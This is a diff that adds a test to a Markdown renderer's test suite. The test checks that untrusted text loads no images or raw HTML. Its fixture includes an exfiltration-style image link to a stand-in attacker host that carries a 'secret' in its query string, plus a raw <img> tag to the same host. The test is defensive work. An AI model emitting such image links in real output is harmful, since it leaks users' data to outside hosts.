@@ -105,6 +105,32 @@ describe("Markdown", () => {
     )?.[1]
     expect(codeStyles).toContain("background:var(--chakra-colors-transparent)")
   })
+
+  it("loads nothing from untrusted text", () => {
+    const text = [
+      "Done. ![chart](https://evil.example/x.png?d=secret)",
+      '<img src="https://evil.example/y.png"> <b>raw</b>',
+      "**bold** [link](https://example.com)",
+    ].join("\n\n")
+    const render = (untrusted: boolean) =>
+      renderToStaticMarkup(
+        <ChakraProvider>
+          <Markdown untrusted={untrusted}>{text}</Markdown>
+        </ChakraProvider>,
+      )
+    const html = render(true)
+    expect(html).not.toContain("<img")
+    expect(html).not.toContain("<b>")
+    // Images become links, raw HTML is left out, and Markdown still works
+    expect(html).toContain('href="https://evil.example/x.png?d=secret"')
+    expect(html).toContain(">chart</a>")
+    expect(html).not.toContain("y.png")
+    expect(html).toContain("raw")
+    expect(html).toContain("<strong>bold</strong>")
+    expect(html).toContain('href="https://example.com"')
+    // Trusted text keeps its images
+    expect(render(false)).toContain("<img")
+  })
 })
 
 describe("repoImagePath", () => {
